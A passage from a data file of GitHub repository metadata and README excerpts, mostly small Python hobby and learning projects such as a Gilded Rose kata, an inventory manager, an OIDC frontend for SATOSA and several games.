delete category. Product  In product tab admin can add, delete and update product. Sales  In sales tab admin can see bills. Billing  This tab is available for employee. In Billing tab employee can create bill with selected price in product tab. Contributing The main reason to publish something open source, is that anyone can just jump in and start contributing to my project. So If you'd like to contribute, be sure to review the contribution guidelines and then please fork the repository and use a feature branch. Pull requests are warmly welcome. Author Amit Kumar Datta Student at class 10 Municipal model high school, Chittagong Bangladesh License MIT License 
417457444;GildedRoseKata;https://github.com/satyaki-mallick/GildedRoseKata;Python;2021-10-15T10:22:10Z;0;0;0;"Gilded Rose Refactoring Kata This Kata was originally created by Terry Hughes (http://twitter.com/TerryHughes). It is already on GitHub here. See also Bobby Johnson's description of the kata. I translated the original C# into a few other languages, (with a little help from my friends!), and slightly changed the starting position. This means I've actually done a small amount of refactoring already compared with the original form of the kata, and made it easier to get going with writing tests by giving you one failing unit test to start with. I also added test fixtures for Text-Based approval testing with TextTest (see the TextTests) As Bobby Johnson points out in his article ""Why Most Solutions to Gilded Rose Miss The Bigger Picture"", it'll actually give you better practice at handling a legacy code situation if you do this Kata in the original C#. However, I think this kata is also really useful for practicing writing good tests using different frameworks and approaches, and the small changes I've made help with that. I think it's also interesting to compare what the refactored code and tests look like in different programming languages. I use this kata as part of my work as a technical coach. I wrote a lot about the coaching method I use in this book Technical Agile Coaching with the Samman method. A while back I wrote this article ""Writing Good Tests for the Gilded Rose Kata"" about how you could use this kata in a coding dojo. How to use this Kata The simplest way is to just clone the code and start hacking away improving the design. You'll want to look at the ""Gilded Rose Requirements"" which explains what the code is for. I strongly advise you that you'll also need some tests if you want to make sure you don't break the code while you refactor. You could write some unit tests yourself, using the requirements to identify suitable test cases. I've provided a failing unit test in a popular test framework as a starting point for most languages. Alternatively, use the ""Text-Based"" tests provided in this repository. (Read more about that in the next section) Whichever testing approach you choose, the idea of the exercise is to do some deliberate practice, and improve your skills at designing test cases and refactoring. The idea is not to re-write the code from scratch, but rather to practice designing tests, taking small steps, running the tests often, and incrementally improving the design. Gilded Rose Requirements in other languages  English Español Français 日本語 Português Русский ไทย 中文 한국어  Text-Based Approval Testing This code comes with comprehensive tests that use this approach. For information about how to run them, see the texttests README Translating this code More translations are most welcome! I'm very open for pull requests that translate the starting position into additional languages. Please note a translation should ideally include:  a translation of the production code for 'update_quality' and Item one failing unit test complaining that ""fixme"" != ""foo"" a TextTest fixture, ie a command-line program that runs update_quality on the sample data for the number of days specified.  Please don't write too much code in the starting position or add too many unit tests. The idea with the one failing unit test is to tempt people to work out how to fix it, discover it wasn't that hard, and now they understand what this test is doing they realize they can improve it. If your programming language doesn't have an easy way to add a command-line interface, then the TextTest fixture is probably not necessary. Better Code Hub I analysed this repo according to the clean code standards on Better Code Hub just to get an independent opinion of how bad the code is. Perhaps unsurprisingly, the compliance score is low!  "
417470153;interview-questions;https://github.com/VitBu/interview-questions;Python;2021-10-15T11:10:09Z;0;0;0;
417547612;crater-scraper;https://github.com/drex04/crater-scraper;Python;2021-10-15T15:24:33Z;0;0;0;crater-scraper Python scraper to populate Crater backend 
417535428;Wifi-Passwords-CLI;https://github.com/Likhith1234/Wifi-Passwords-CLI;Python;2021-10-15T14:47:16Z;0;0;0;"Wifi-Passwords-CLI This is a CLI-based Python Application Introduction This application is used to know the list of passwords of the wireless networks that are connected to your device till date. Requirements  Latest version of Python3 Latest version of ""pip""  Setup  git clone https://github.com/Likhith1234/Wifi-Passwords-CLI.git cd ./Wifi-Passwords-CLI/Wifi_Pass python setup.py  Run python __init__.py "
417516114;cs50;https://github.com/WeliWadi/cs50;HTML;2021-10-15T13:49:31Z;0;0;0;
417542241;qreg;https://github.com/DrDougPhD/qreg;Python;2021-10-15T15:08:09Z;0;0;0;qreg: A Quantile Regression package for Python This package implements the Quantile Regression estimation method, as described here: https://en.wikipedia.org/wiki/Quantile_regression 
417434700;arista-downloader;https://github.com/titom73/arista-downloader;Python;2021-10-15T09:01:04Z;0;0;0;Arista Software Downloader Script to download Arista softwares to local folder, Cloudvision or EVE-NG. Supported Version & platform (--ver):  EOS using version schema only (4.x.y) Cloudvision using cvp-x.y.z TerminAttr using TerminAtt-x.y.z  Supported images (--img):  INT: International version 64: 64 bits version 2GB for 2GB flash platform 2GB-INT: for 2GB running International vEOS: Virtual EOS image vEOS-lab: Virtual Lab EOS vEOS64-lab: Virtual Lab EOS running 64B cEOS: Docker version of EOS cEOS64: Docker version of EOS running in 64 bits RN: To download Release Notes only kvm / ova / rpm / upgrade: For Cloudvision platform  Requirements Repository requires Python >=3.6 with following requirements: cryptography paramiko requests requests-toolbelt scp tqdm  Installation $ pip install git+https://github.com/titom73/arista-downloader Usage  Download EOS locally  $ arista-download --api <Your Arista.com Token> --ver 4.26.2F [...] SHA512 checksum correct  Download vEOS-lab on EVE-NG + image Installation  # Raw image with ZTP $ arista-download --api <Your Arista.com Token> --ver 4.27.0F --img vEOS-lab --eve  # Disabling ZTP $ arista-download --api <Your Arista.com Token> --ver 4.27.0F --img vEOS-lab --eve --disable_ztp Author From an original idea of @Mark Rayson in arista-netdevops-community/eos-scripts License Code is under Apache2 License 
417476505;wazirxpy;https://github.com/athulvis/wazirxpy;Python;2021-10-15T11:33:55Z;0;0;0;wazirxpy Unofficial Python Wrapper for Wazirx API 
417556815;divide-big-num;https://github.com/vuminhngoc22/divide-big-num;Python;2021-10-15T15:54:47Z;1;1;0;"divide-big-num Python code to divide big numbers ####CODE#### import math def chiahaisolon(sobichia, sochia): a = """"; b = 0; temp = ord(sobichia[b]) - ord('0'); while (temp < sochia): 	temp = (temp * 10 + ord(sobichia[b + 1]) - ord('0')); 	b += 1;  b += 1;  while ((len(sobichia)) > b): 	 	a += chr(math.floor(temp // sochia) + ord('0')); 	 	temp = ((temp % sochia) * 10 + ord(sobichia[b]) - ord('0')); 	b += 1;  a += chr(math.floor(temp // sochia) + ord('0'));   if (len(a) == 0): 	return ""0"";  return a;  sobichia = ""1248163264128256512""; sochia = 125; print(chiahaisolon(sobichia, sochia)); OR YOU CAN DOWNLOAD print(chiahaisolon(sobichia, sochia)); "
417555541;Copyer;https://github.com/kerem3338/Copyer;Python;2021-10-15T15:50:33Z;1;1;0;Copyer is simple file copyer TR Bu kodu gendimi birazda geliştirmek için yazılmıştır 
417438076;hello;https://github.com/SymbolstarNongbri/hello;;2021-10-15T09:12:24Z;0;0;0;
417491893;rustyGraph;https://github.com/athulramesh/rustyGraph;Rust;2021-10-15T12:29:25Z;0;0;0;rustyGraph Python graph module developed in Rust 
417458454;hangman;https://github.com/RohanJagpal/hangman;;2021-10-15T10:25:56Z;0;0;0;hangman A simple hangman game written with Python 
417515038;upgrad_notebook;https://github.com/RajeevSharma110/upgrad_notebook;Jupyter Notebook;2021-10-15T13:46:10Z;0;0;0;upgrad_notebook This repo contains python conceptual snippets. 
417520431;TriviaGame;https://github.com/juliobillet/TriviaGame;Python;2021-10-15T14:02:21Z;0;0;0;
417543471;hello;https://github.com/richimorales13/hello;HTML;2021-10-15T15:12:17Z;0;0;0;
417446309;SATOSA-oidcop;https://github.com/UniversitaDellaCalabria/SATOSA-oidcop;Python;2021-10-15T09:41:13Z;0;0;0;"SATOSA oidcop frontend    SATOSA Frontend based on identity python oidcop. Features Endpoints:   provider discovery  jwks uri  authorization  token  userinfo  registration  registration_read endpoint  introspection endpoint (https://github.com/IdentityPython/SATOSA/pull/378/commits/473310fb5968561f962bf6bcc6b6eacbf78f0b3e)  token exchange  Requirements  satosa mongodb, see Satosa-Saml2Spid mongo example.  Setup pip install satosa_oidcop  Configuration Anyone can migrate its oidcop configuration, from flask_op or django-oidc-op or whatever, in SATOSA and without any particular efforts. Looking at the example configuration we see that config.op.server_info have a standard SATOSA configuration with the only addition of the following customizations, needed in SATOSA for interoperational needs. These are:  autentication          authentication:           user:             acr: urn:oasis:names:tc:SAML:2.0:ac:classes:InternetProtocolPassword             class: satosa.frontends.oidcop.user_authn.SatosaAuthnMethod   userinfo         userinfo:          class: satosa.frontends.oidcop.user_info.SatosaOidcUserInfo  authentication inherits oidcop.user_authn.user.UserAuthnMethod and overloads two methods involved in user authentication and verification. These tasks are handled by SATOSA in its authentication backends. userinfo inherits oidcop.user_info.UserInfo and proposes a way to store the claims of the users when they comes from the backend. The claims are stored in the session database (actually mongodb) and then they will be fetched during userinfo endpoint (and also token endpoint, for having  them optionally in id_token claims). SSO and cookies oidcop SSO and cookies were not have been implemented because SATOSA doesn't support logout, because of this they are quite useless at this moment. Client and Session Storage MongoDB is the storage, here some brief descriptions for a demo setup. The interface to SATOSA oidcop storage is satosa.frontends.oidcop.storage.base.SatosaOidcStorage and it have three methods:  get_client_by_id(self, client_id:str, expired:bool = True) store_session_to_db(self, session_manager, **kwargs) load_session_from_db(self, req_args, http_headers, session_manager, **kwargs)  satosa.frontends.oidcop.storage.mongo.Mongodb overloads them to have I/O operations on mongodb. Demo Satosa-Saml2Spid is a custom Satosa configuration to deal with many SAML2 and OIDC Relying parties and many eduGain and SPID Identity Provider.  Contributions Feel free to open issues and pull requests, we build communities! Developer notes Storage design At this time the storage logic is based on oidcop session_manager load/dump/flush methods. Each time a request is handled by an endpoint the oidcop session manager loads the definition from the storage, only which one are strictly related to the request will be loaded in the in memory storage of oidcop. Roadmap   unit tests  pytest mongo mock  test response_type = ""code id_token token"" (https://github.com/IdentityPython/SATOSA/pull/378/commits/a61dc99503bcb9d4982b77a6ddcf0c41b6732915)  auto prune expired sessions with mongodb index (https://github.com/IdentityPython/SATOSA/pull/378/commits/137993f77bfb05b44f25ba6df3784e8fb86a31ce, mongo index)  token refresh (https://github.com/IdentityPython/SATOSA/pull/378/commits/59c0a53fa73e70551d76c5355c051a7389ab99fd)  rfc7523 - private_key_jwt test > a RP cannot reach the token endpoint if a user have not passed by authz endpoint before. private_key_jwt is a kind of authentication where the user interaction is not needed.  DPoP support  Tests Before you run the tests mind that you've to start a local mongod instance. pip install pytest pytest --cov=satosa_oidcop -v --cov-report term --cov-fail-under=95 tests/  Authors  Giuseppe De Marco  Università della Calabria  Credits  Roland Hedberg Andrea Ranaldi  ISPRA Ambiente Identity Python Community  "
417421376;weatherbot;https://github.com/James-Wachuka/weatherbot;Python;2021-10-15T08:16:46Z;0;0;0;
417552186;FirstRepo;https://github.com/tkoss43/FirstRepo;HTML;2021-10-15T15:39:46Z;0;0;0;
417432762;rauly.rs;https://github.com/frahz/rauly.rs;Rust;2021-10-15T08:54:45Z;0;0;0;
417449749;sitioWebGrupo1;https://github.com/vordonez74/sitioWebGrupo1;JavaScript;2021-10-15T09:53:49Z;0;0;0;
417480759;Jupyter;https://github.com/JonathaCosta/Jupyter;Jupyter Notebook;2021-10-15T11:49:28Z;0;0;0;Jupyter Códigos diversos em Python utilizando o Jupyter Notebook. 
417498859;Image-Processing;https://github.com/OmarSalah20/Image-Processing;Jupyter Notebook;2021-10-15T12:53:51Z;0;0;1;Image-Processing image processing with Python using OpenCV library    Topic Session Description     Read and Write -- reading and writing images and videos with openCV    
417544910;docker-sdk-tutorial;https://github.com/LiamJolly/docker-sdk-tutorial;;2021-10-15T15:16:12Z;0;0;0;docker-sdk-tutorial An introduction to the Python Docker SDK 
417490095;Data-analysis;https://github.com/ahmedkaml/Data-analysis;;2021-10-15T12:23:15Z;0;0;0;Data-analysis Data analysis and visualisation using python 
417474099;hello;https://github.com/dumooon/hello;HTML;2021-10-15T11:24:35Z;0;0;0;
417548713;Projects;https://github.com/shank-p/Projects;Python;2021-10-15T15:27:58Z;0;0;0;
417512983;fuzzy-computing-machine;https://github.com/HelixDev/fuzzy-computing-machine;;2021-10-15T13:39:32Z;0;0;0;fuzzy-computing-machine an advanced Discord bot written in Python. 
417534074;pySudoku;https://github.com/sauterb/pySudoku;Python;2021-10-15T14:43:07Z;0;0;0;pySudoku Recursive algorithm written in Python solves sudoku puzzles of ANY difficulty. Includes basic GUI for entering Sudoku. 
417537103;hello;https://github.com/theZenKoala/hello;;2021-10-15T14:52:27Z;0;0;0;
417472227;rock-paper-scissors;https://github.com/josikie/rock-paper-scissors;Python;2021-10-15T11:17:41Z;0;0;0;rock-paper-scissors Rock Paper Scissors Game with Python 
417524273;Simple-Multi-Client-Server;https://github.com/ofekerez/Simple-Multi-Client-Server;Python;2021-10-15T14:13:24Z;0;0;0;
417456809;Encemoji.py;https://github.com/Arinaltopek/Encemoji.py;Python;2021-10-15T10:19:46Z;0;0;0;Encemoji.py Skrip Encrypt Python Dengan Modul Emoji 
417468971;hello;https://github.com/cjdizon03/hello;HTML;2021-10-15T11:05:54Z;0;0;0;
417442752;LeetCode;https://github.com/dianeyeo/LeetCode;;2021-10-15T09:28:52Z;0;0;0;LeetCode Python and SQL practice on LeetCode 
417438932;Face-Mask-Detection;https://github.com/manasa017/Face-Mask-Detection;Python;2021-10-15T09:15:33Z;0;0;0;Face-Mask-Detection Face Mask Detector in Python using OpenCV with Graphical User Interface. Download all the required modules using pip Download the XML files Create  folder inside the directory to store the captured images. 
417502048;Deblur-Project;https://github.com/UmbertoCarlucci01/Deblur-Project;Jupyter Notebook;2021-10-15T13:04:03Z;0;0;0;
417504115;Playing_with_APIs;https://github.com/logarithm27/Playing_with_APIs;Python;2021-10-15T13:11:05Z;0;0;0;Playing_with_APIs Playing with football api using python and focusing on Chlesea football club performance in Champions League and Premier League. 
417554972;Real-Time-Face-Detection;https://github.com/sou35/Real-Time-Face-Detection;;2021-10-15T15:48:39Z;0;0;0;Real-Time-Face-Detection Face Detection in Python Using a Webcam 
417467162;lenet-5;https://github.com/sammyxiong/lenet-5;;2021-10-15T10:59:40Z;0;0;0;lenet-5 lenet-5的python实现 
417443293;mailspampython;https://github.com/KhanhVNMC/mailspampython;Python;2021-10-15T09:30:44Z;1;1;0;Python Mail Spam Simple Mail Spam with Python 3 - GiaKhanhVN Uh, the title say it all, cya! 
417428925;pyJo;https://github.com/wowothk/pyJo;CSS;2021-10-15T08:42:11Z;0;0;1;"Data Integrator With Flask Structure . ├── app/ │   ├── controllers/ │   │   ├── data_management.py │   │   ├── data_preprocessing.py │   │   └── file_uploader.py │   ├── lib/ │   │   ├── preprocessing.py │   │   └── uploader.py │   │   └── helper.py │   ├── static │   ├── templates │   ├── __init__.py │   ├── extensions.py │   ├── models.py │   └── register.py ├── run.py └── settings.py  Penggunaan  Setup environment Setup database Install library terdaftar di requirements.txt Buat file .env untuk mendefinisikan keperluan database di settings.py Lalu jalankan ini untuk initialisasi databasenya flask db init lalu flask db migrate -m ""initial migration"" dan jangan lupa flask db upgrade Jalankan run.py  "
417545547;hello;https://github.com/SnizhkoArthur/hello;;2021-10-15T15:18:05Z;0;0;0;
417484432;Argon;https://github.com/BlueGlassBlock/Argon;Python;2021-10-15T12:02:56Z;2;2;0;Argon     一个基于 graia-broadcast 和 mirai-api-http v2 的 Python SDK。 本项目适用于 mirai-api-http 2.0 以上版本。 目前仍处于开发阶段，内部接口可能会有较大的变化。 The Stasis / 停滞 为维持 GraiaProject 统一性，本项目正式由 Argon 更名为 Ariadne 本项目已Archive. Ariadne repo link 安装 已移除 PyPI 包 鸣谢&相关项目  这些项目也很棒, 去他们的项目页看看, 点个 Star 以鼓励他们的开发工作, 毕竟没有他们也没有 Argon.  特别感谢 mamoe 给我们带来这些精彩的项目:  mirai: 一个高性能, 高可扩展性的 QQ 协议库 mirai-console: 一个基于 mirai 开发的插件式可扩展开发平台 mirai-api-http: 为本项目提供与 mirai 交互方式的 mirai-console 插件  GraiaProject 的其他项目:  Broadcast Control: 扩展性强大, 模块间低耦合, 高灵活性的事件系统支持，是 Argon 的底层。兼容 Components: 简单的消息链元素选择器 不兼容，将提供移植 Template: 消息模板 不兼容，将提供移植 Saya 间接但简洁的模块管理系统. 兼容 Scheduler: 简洁的基于 asyncio 的定时任务实现. 兼容 Application (a.k.a v4): 本项目的结构基础，支持 mirai-api-http v1.x 版本 。不完全兼容，建议参照项目内实现名称进行移植工作 Avilla (a.k.a v5): 下一代即时通讯框架。The Future。不兼容  Argon 在开发中还参考了如下项目：  YiriMirai: 本项目的 adapter 及 MessageChain 实现参考。  许可证 GNU AGPLv3 是本项目的开源许可证. 
417509930;virusStructure;https://github.com/byasyar/virusStructure;Python;2021-10-15T13:29:47Z;0;0;0;"virusStructure Structure of a virus using Python Turtle Graphics: This repository contains two .py files with two different structures; "
417550047;FundMe_brownie;https://github.com/James-spiff/FundMe_brownie;Solidity;2021-10-15T15:32:19Z;0;0;0;
417476678;gerenciador_de_biblioteca;https://github.com/rafael-hsm/gerenciador_de_biblioteca;Python;2021-10-15T11:34:32Z;0;0;0;"Gerenciador de Biblioteca 🤓📚 Requisitos: Rotas da aplicação: [POST] /obras : A rota deverá receber titulo, editora, foto, e autores dentro do corpo da requisição. Ao cadastrar um novo projeto, ele deverá ser armazenado dentro de um objeto no seguinte formato: { id: 1, titulo: ‘Harry Potter’, editora: ‘Rocco’,foto: ‘https://i.imgur.com/UH3IPXw.jpg’, autores: [“JK Rowling”, “…”]}; [POST] /upload-obras: está rota deverá receber um arquivo csv contendo os mesmos parâmetros da rota anterior mas podendo ser salvo em massa no banco de dados [GET] /obras/ : A rota deverá listar todas as obras cadastradas [GET] /file-obras/ : A rota retornar um arquivo contendo todos as obras, deverá ser possível filtrar pela data de criação [PUT] /obras/🆔 : A rota deverá atualizar as informações de titulo, editora, foto e autores da obra com o id presente nos parâmetros da rota [DELETE] /obras/🆔 : A rota deverá deletar a obra com o id presente nos parâmetros da rota Ferramentas utilizadas [x] Python 3.9 [x] Pycharm [x] Django Aplicação publicada Basta clicar no link para acessar a solução 😉 [x] - Heroku "
417552994;ICS3U-Unit5-04-Python-Volume-of-a-Cylinder;https://github.com/haokai-li/ICS3U-Unit5-04-Python-Volume-of-a-Cylinder;Python;2021-10-15T15:42:18Z;0;0;0;ICS3U-Unit5-04-Python-Volume-of-a-Cylinder  
417551692;awsrm;https://github.com/ktasper/awsrm;;2021-10-15T15:38:05Z;0;0;0;awsrm A python implementation of my golang pet-project. 
417487072;Morse-Code-Converter;https://github.com/DharaneeswaranR/Morse-Code-Converter;Python;2021-10-15T12:12:13Z;0;0;0;Morse-Code-Converter Python script to convert a text into Morse Code. 
417460298;NFA_to_DFA;https://github.com/icyfig/NFA_to_DFA;Python;2021-10-15T10:32:35Z;0;0;0;NFA_to_DFA Python program to convert a Non-deterministic Finite Automaton(NFA) to a Deterministic Finite Automaton(DFA) by Powerset construction 
417444360;Inventorymanagement;https://github.com/anmolpurba/Inventorymanagement;Python;2021-10-15T09:34:36Z;0;0;0;"Inventorymanagement I have build a inventory management system using python programming language.By using this project one can do a lot of things like register a new product to our store, product lookup,remove product from store,etc.which i will be discussing each one by one. I have a list known as product_list which will act as database for our project and also a bin_list which conatains the different location where the product is to be storesd.When you will execute the program you will be given to choose from 7 options according to your need.so the options and their working is as follows-:   REGISTER PRODUCT TO STORE: This option will allow the user to register a new product to the store with its unique product code(upc).The user will give the entire information about the product such as its title, description,upc,costprice,sellingprice,category.By giving the all the information correctly the product will get registered in our store and product will be assigned a sku number and product will be stored in our database product_list also.(exception--> if you will enter a already registered product(upc code) then it will raise a exception that ""product with same upc is already registered"").   PRODUCT LOOKUP: This option will allow the user to get details of a already registered product in the store.The user will have to give the sku code of the product and the first step of the algorithm will find the registered product object from the product_list.If the product is found from the list,then it will print all the details of the product such as its title,upc,description, costprice,sellingprice,category.Else if the product is not found from list it will raise exception that ""Product does not exist"".   REMOVE PRODUCT FROM STORE: This option will allow the user to remove the product from store.The user will have to give the sku of the product and the algorithm will find the product if it is present in the product_list.If the product is found in the product list the code will delete the product from the product_list.In fact this code will find the same product in all the bins(location) and will remove the product from all the bins if found in it.   ADD PRODUCT TO BIN: This option will allow the user to add product to bin(location).The user will give sku of the product,quantity of the product and location as input.Firstly the code the find if the product with given sku is present in the product_list or not.If it is present the code will now get the product with the given sku and it will find the bin with given location.After getting these two values, product and bin, it will add the product and its quantity to the product_dict of the found bin.   REMOVE PRODUCT FROM BIN: This option will allow the user to remove product from bin(location).The user will give sku of the product,quantity of the product and location as input.Firstly the code will find if the product with given sku and bin is present in product_list and bin_list respectively.Then it will check if the quantity of the product with given sku is greater than the given quantity it will remove the quantity from the product_dict of the bin.   VIEW PRODUCTs BY LOCATION: This option will allow the user to view all the products present in the given location.Firstly the code will find the bin from the bin_list and once we found the bin by the given location we will get the product_dict from given bin.The product_dict of the bin will contain of the products.   ADD NEW LOCATION This option will not expect any input from user.It will simply make an object of the bin class and due to init constructor a new location will be assigned to it.Then the bin object will add to the bin_list.   "
417518460;Remote-Shutdown;https://github.com/megachickn101/Remote-Shutdown;Python;2021-10-15T13:56:45Z;0;0;0;
417533605;GUI_registration_app;https://github.com/amj203/GUI_registration_app;Python;2021-10-15T14:41:39Z;0;0;0;
417522141;pylegram;https://github.com/i0tool5/pylegram;Python;2021-10-15T14:07:13Z;0;0;0;pylegram Small python package to work with Telegram Bot API The purpose of this package is to simplify the work with Telegram bots and provide interfaces for interacting with them. Work in progress 
417549471;NUACCESS-autoencoder;https://github.com/Ruiiw/NUACCESS-autoencoder;Python;2021-10-15T15:30:25Z;0;0;0;NUACCESS-autoencoder Autoencoder that can reconstruct hyperspectral imaging data. Written in Python. In this project, we take the first step toward solving the problem of separating the mixed X-ray Fluorescence (XRF) image of an overpainted oil painting that has top and bottom layers. In order to obtain distinctive XRF images for the different layers, an autoencoder is needed first to extract features from the hyperspectral imaging (HSI) data of the painting. We propose using a convolutional neural network, which is a type of artificial neural network in machine learning, for the architecture of the autoencoder. An artificial neural network has multiple layers, each holds a collection of neurons and can learn information of a certain problem. It is an unsupervised learning method, meaning that the input and output are not labeled and the algorithm needs to discover the patterns in the data by itself. Our results also show this autoencoder’s potential to be adopted as a denoiser for processing hyperspectral images. 
417547066;blog;https://github.com/HugoDev73/blog;JavaScript;2021-10-15T15:22:52Z;0;0;0;
417488210;TurtleGame;https://github.com/KanakPitalia/TurtleGame;Python;2021-10-15T12:16:18Z;0;0;0;
417440633;IDATT2502---ex7-Clustering-of-data;https://github.com/Endrelur/IDATT2502---ex7-Clustering-of-data;Jupyter Notebook;2021-10-15T09:21:19Z;0;0;0;7 
417557227;Library-Management;https://github.com/GetPsyched/Library-Management;;2021-10-15T15:56:12Z;0;0;0;Library-Management A Python application to manage a library's database 
417453579;First-Project;https://github.com/Jayachandra-12/First-Project;Python;2021-10-15T10:07:19Z;0;0;0;First-Project prediction of price of airline tickets using machine learning with python 
417514688;Blackjack-Game;https://github.com/MukitoZ/Blackjack-Game;Python;2021-10-15T13:45:03Z;0;0;0;
417431475;venv;https://github.com/kgz/venv;Batchfile;2021-10-15T08:50:43Z;0;0;0;
417504505;py3;https://github.com/aspirus-in/py3;Python;2021-10-15T13:12:17Z;0;0;0;py3 A Python REPL with syntax highlighting and shell. 
417514947;snake-water-game;https://github.com/zainjathol/snake-water-game;;2021-10-15T13:45:49Z;0;0;0;
417510226;rdppy;https://github.com/avitase/rdppy;Python;2021-10-15T13:30:44Z;0;0;0;
417539106;billing-software;https://github.com/karthideveloper2021/billing-software;Python;2021-10-15T14:58:34Z;0;0;0;
417487146;Investigate-a-tmdb-movies_Dataset;https://github.com/mohamed7632/Investigate-a-tmdb-movies_Dataset;Jupyter Notebook;2021-10-15T12:12:26Z;0;0;0;Investigate-a-tmdb-movies_Dataset I choose the TMDb movie data set for data analysis. This data set contains information about 10,000 movies collected from The Movie Database (TMDb), including user ratings and revenue.I would like to find other intresting patterns in the dataset. Using python libraries like pandas , numpy , matplotlib, seaborn 
417480037;VigenereCipher;https://github.com/Serpentina747/VigenereCipher;;2021-10-15T11:46:57Z;0;0;0;VigenereCipher Python script that simulates Vigener's Cipher and calculates entropies 
417473125;face_recognition_Attendance_Machine;https://github.com/Ehabdiab2000/face_recognition_Attendance_Machine;Python;2021-10-15T11:21:06Z;0;0;0;face_recognition Face Recognition Attendance and Access Control Machine Using Python, PYQT, Sqlite , Twilio , Raspberrypi 
417504740;Projeto-qr2;https://github.com/DuduNeves/Projeto-qr2;Python;2021-10-15T13:13:04Z;0;0;0;Projeto-qr2 Projeto básico de uma CRDU em Python com Mysql, feito por um iniciante. 
417525476;Paint;https://github.com/ofekerez/Paint;Python;2021-10-15T14:16:59Z;0;0;0;
417553233;CSV-to-DB;https://github.com/Constantiin/CSV-to-DB;Python;2021-10-15T15:43:04Z;0;0;0;
417550684;PyDomino;https://github.com/felipenavtarr/PyDomino;Python;2021-10-15T15:34:38Z;0;0;0;
417484884;text_adventure_game;https://github.com/cescosan/text_adventure_game;Python;2021-10-15T12:04:39Z;0;0;0;text_adventure_game A text-based adventure game made with python 3. 
417550954;hummingbird;https://github.com/davidjaras/hummingbird;;2021-10-15T15:35:30Z;0;0;0;Hummingbird Use Python to access to several servers and execute commands 
417446595;Blogwebsite-using-flask;https://github.com/tejas910/Blogwebsite-using-flask;JavaScript;2021-10-15T09:42:14Z;0;0;0;Blogwebsite-using-flask This is blog website made using flask framework in python. 
417508677;Django-TodoApp;https://github.com/Magpiny/Django-TodoApp;Python;2021-10-15T13:25:42Z;0;0;0;
417547303;dockerized_django;https://github.com/jorgeas80/dockerized_django;Dockerfile;2021-10-15T15:23:38Z;0;0;0;dockerized_django Basic Hello world project with Python 3+ and Django 3+. SQLite 3 database is used. Requisites You need to install  Docker Engine Docker Compose  Get started Run this from a shell pointing to the root dir of this repo to create a Django project named hello_world_django docker-compose run web django-admin startproject hello_world_django . Now start the container with this shell command docker-compose up Now you can go to http://localhost:8000/ and you'll see the welcome page of your Django project 
417522978;UneexCourse;https://github.com/Temish09/UneexCourse;Python;2021-10-15T14:09:37Z;0;0;0;UneexCourse Python course by FrBrGeorge 2021 
417433942;recommendation-platform;https://github.com/lih1989/recommendation-platform;Jupyter Notebook;2021-10-15T08:58:38Z;0;0;0;Рекомендательные системы - эксперементальная платформа /sandbox - Jupiter блокнот для набросков логики и методов /_docker - Папка содержащая файл докера и зависимости питона для разворачивания системы /app/main.py - Собственно сам сервер, данные для обучения и скрипт для расчёта ближайших соседей /app/data - сырые данные для обучения /app/sampleRecommendation.py - скрипт для поиска-расчёта ближайших соседей  sampleRecommendation.py использован Content Base подход для расчёта рекоммендаций, то есть мы нормализуем, анализируем свойства объектов и ищем ближайших соседей от исходного объекта  
417551933;brownie_fund_me;https://github.com/tjlangan/brownie_fund_me;Solidity;2021-10-15T15:38:52Z;0;0;0;
417538842;my-itmo-ru-to-ical;https://github.com/iburakov/my-itmo-ru-to-ical;Python;2021-10-15T14:57:42Z;0;0;0;"ITMO schedule to iCalendar converter Сервис, который ходит на my.itmo.ru за расписанием и экспортирует его как iCalendar с публичной ссылкой. Позволяет автоматически и с автообновлением экспортировать пары в календари Google, iCloud и другие. Пререквизиты К сожалению, нужен логин и пароль от ИСУ, поэтому безопасности ради публичного сервиса не будет. Понадобится:  сервер с публичным IP адресом; git, docker, docker-compose в нём.  Как запустить  Склонировать репозиторий: git clone https://github.com/iburakov/my-itmo-ru-to-ical.git && cd my-itmo-ru-to-ical  Заполнить конфиг: cp config/config.py.template config/config.py && vim config/config.py  Запустить сервис: docker-compose up -d Достать ссылку из логов: docker-compose logs | grep ""path for calendar"" Собрать ссылку: http://<ip/domain сервера>:35601<path> Если по ссылке скачивается .ics файл, всё работает Импортировать ссылку в свой календарь ??? PROFIT!!!  PS. Ссылка содержит хеш имени пользователя и пароля. Меняются данные - меняется ссылка. PPPS. Если вдруг стандартный порт порт занят, поправьте первый порт в docker-compose.yml на свободный. "
417490516;DataScienceAssignments;https://github.com/omwro/DataScienceAssignments;Jupyter Notebook;2021-10-15T12:24:47Z;0;0;0;DataScienceGithub 
417507951;Password-Generator;https://github.com/denford-art/Password-Generator;;2021-10-15T13:23:17Z;0;0;0;Password Generator  This project was designed to quickly obtain a large number of unique, secure passwords. When implementing the project, only Python 3 and its standard random module were used. Example of application operation  Author  Denis Dedov - Initial stage of development - denford-art 
417500560;pyrainfall;https://github.com/AG3NTZ3R0/pyrainfall;Python;2021-10-15T12:59:42Z;0;0;0;PyRainfall Collaborative Project for CS312: Software Engineering at Sacred Heart University Project Vision FOR anyone WHO needs basic precipitation information for their local area, THE PyRainfall application is a CLI THAT provides machine learning rainfall predictions, standard forecasts, atmospheric pressure information in relation to hurricanes, and user input gathering features that improve the way that an organization can gather information and forecast predictions. UNLIKE other services or package software products, OUR product provides very capable services at a moderate cost. 
417485523;brownie_fund_me;https://github.com/GH023/brownie_fund_me;Solidity;2021-10-15T12:06:40Z;0;0;0;
417559223;anomaly-detection-exercises;https://github.com/jamesallen0351/anomaly-detection-exercises;Jupyter Notebook;2021-10-15T16:02:30Z;0;0;0;"anomaly-detection-exercises-README.md This repository is for my anomaly detection exercises and notes Anomaly  Anomalies are the unusual, unexpected, surprising patterns in the observed world. An anomalous data point is a deviation from a rule or from what is regarded as normal; an outlier. An anomaly is any event or measurement that is out of the ordinary regardless of whether it is exceptional or not.  Outlier  An outlier is an observation that lies an abnormal distance from other values in a random sample from a population. In a sense, this definition leaves it up to the analyst (or a consensus process) to decide what will be considered abnormal. Before abnormal observations can be singled out, it is necessary to characterize normal observations  "
417510608;Django-Bookstore;https://github.com/Sachin-chaurasiya/Django-Bookstore;Python;2021-10-15T13:31:49Z;0;0;0;Django BookStore Project  Added Docker Support for code and Database (Postgresql) Created Accounts app for user accounts Created Custom user Model to override default user Model Created Custom User creation and updation forms. Added Custom user model in admin Added Pages App Added Authentication for users Added test for authentication Added configuration for static assests Added crispy form for django form  
